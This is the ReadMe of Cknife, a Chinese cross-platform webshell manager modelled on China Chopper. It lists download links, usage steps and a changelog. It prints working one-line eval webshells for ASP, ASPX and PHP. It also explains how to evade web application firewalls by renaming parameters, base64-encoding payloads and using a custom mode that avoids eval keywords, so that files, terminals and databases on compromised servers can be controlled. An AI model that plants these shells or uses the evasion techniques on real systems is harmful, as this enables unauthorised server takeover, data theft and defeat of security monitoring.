软件名称：Cknife
中文名称：C刀
源码地址：https://github.com/Chora10/Cknife
下载地址：http://pan.baidu.com/s/1nul1mpr  密码：f65g
官方博客：http://www.ms509.com/
作者：	  Chora && MelodyZX
----------------------------------------------------------------------------------------------------------
免责申明：
	请使用者注意使用环境并遵守国家相关法律法规！
	由于使用不当造成的后果本厂家不承担任何责任！
----------------------------------------------------------------------------------------------------------
程序在使用过程中难免有各种BUG，及时关注看一下是否有更新吧，说不定己经修补了呢。
----------------------------------------------------------------------------------------------------------


一、运行环境：

安装了JDK1.7+的所有操作系统

二、文件说明：
------------------------------------------------------------------
Cknife.jar	Cknife主程序
------------------------------------------------------------------
Cknife.db	Cknife的数据库(不存在会自动生成)
Config.ini	Cknife的配置文件(不存在会自动生成)
ReadMe.txt	你现在正在看的(可删除)
1.jsp		JSP服务端脚本(可删除)
------------------------------------------------------------------

三、使用说明：

服务端脚本支持ASP、ASPX、PHP、JSP、Customize(自定义)。
代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create_function、assert等）

ASP:        
<%eval request("Cknife")%>
　	
ASP.NET:    
<%@ Page Language="Jscript"%><%eval(Request.Item["Cknife"],"unsafe");%>

PHP:        
<?php @eval($_POST['Cknife']);?>

JSP:	    
[代码详见1.jsp]

Customize:  
自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与C刀进行交互即可。此模式可按需定制，比如只要浏览目录，或是只要虚拟终端功能，代码可以很简短。


四、数据库功能：

首次使用在列表里点击右键，选择数据库管理会提示请先配置数据库，点击配置数据库按钮选择对应的连接方式连接即可。

五、过WAF

这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义，主程序只是图形的展示，以及数据的发送。
我分开了每一个步骤写入到配置文件里面，用户可以自定义任何代码，包括更改参数名称，参数内容。 
比如： 
SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel 设置皮肤为nimbus 
SPL=->|               			       表示截取数据的开始符号 
SPR=|<-               			       表示截取数据的结束符号 
CODE=code         			       编码参数 
ACTION=action    			       动作参数 
PARAM1=z1         			       参数1 
PARAM2=z2         			       参数2 
PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
PHP_INDEX=...             		       显示主页功能的代码放这儿
PHP_READDICT=...      			       读取主页功能的代码放这儿
PHP_READFILE=...       			       读取文件功能的代码放这儿
PHP_DELETE=...           		       删除文件夹以及文件功能的代码放这儿
PHP_RENAME=...         			       重命名文件夹以及文件功能的代码放这儿
PHP_NEWDICT=...        			       新建目录功能的代码放这儿
PHP_UPLOAD=...          		       上传文件功能的代码放这儿
PHP_DOWNLOAD=...    			       下载文件功能的代码放这儿
PHP_SHELL=...              		       虚拟终端功能的代码放这儿
PHP_DB_MYSQL=...			       管理MYSQL数据库功能的代码放这儿
ASP_...=...
ASPX_...=...
JSP_...=...

除了修改以上参数过WAF外，程序还额外提供了一种Customize过WAF的模式。
Customize模式原本是用于支持一些程序默认不支持的脚本，比如CFM、ASMX、ASHX、PY等等，只要用户自写的脚本能正确与菜刀进行交互即可。

换一个思考方式，如果我们自写一个PHP脚本实现了列文件以及目录的功能，它能够正确的与C刀进行交互，这个时候如果我们选择PHP(Eval)的连接方式就会连接失败。
应该选择Customize模式进行连接。有人说为什么一句话就可以连接，你偏偏还要写这么多代码用Customize模式连接？如果一个很厉害的WAF检测eval,assert等关键词
，你的一句话实在是饶不过，这个时候你可以不用一句话，就在PHP脚本里用正常代码实现列文件以及目录，然后用Customize模式连接就达到了过WAF的目的。

Customize(自定义)模式跟其他模式一样，每一个步骤也都写入到配置文件里面，用户同样可以参数名称以及参数内容。
比如你自写了用Customize模式连接的Customize.php服务端。显示主页功能提交的参数应该是：密码=1&action=index以及密码=1&action=readdict。
如果C刀普及以后WAF厂商肯定会把readdict列入黑名单，这个时候你就可以修改readdict的名称为其他名称，同样可以修改action的名称，也可以修改1为其他字符
CUS_MAKE=1 
CUS_INDEX=index 
CUS_READDICT=readdict 
CUS_READFILE=readfile 
CUS_SAVEFILE=savefile 
CUS_DELETE=delete 
CUS_RENAME=rename 
CUS_NEWDICT=newdict 
CUS_UPLOAD=upload 
CUS_DOWNLOAD=download 
CUS_SHELL=shell

六、更新日志：

20160318
1、优化界面，右边栏点击目录后左边栏也会选中
2、修复ASP、ASPX、JSP在打开空目录时会失败的问题
3、将默认皮肤Graphite添加到皮肤切换功能
4、虚拟终端增加标识符方便用户分辨
5、数据库部分功能增加多线程

20160317
1、优化文件管理左边栏的打开方式；
2、文件管理所有功能使用多线程，防止高延迟请求界面会卡的情况发生。

20160316
1、修复在Linux下默认皮肤显示乱码的问题；
2、添加ASPX对MSSQL、ACCESS的支持；
3、更换皮肤解决选中后看不清的情况。

20160314
1、添加ASP对MSSQL、ACCESS的支持；
2、修复中文路径启动失败的问题。

20160311
1、修复模拟终端若干BUG；
2、模拟终端使用多线程，防止高延迟请求界面会卡的情况发生。

20160310
1、JSP支持MYSQL；
2、修复在Windows下，文件管理会多出一个盘符；

20160307
1、连接失败返回详细信息，方便用户分析问题。

20160301
1、合并Cknife与Cknife_Skin；
2、添加数据库功能，添加PHP对MYSQL、ORACLE的支持。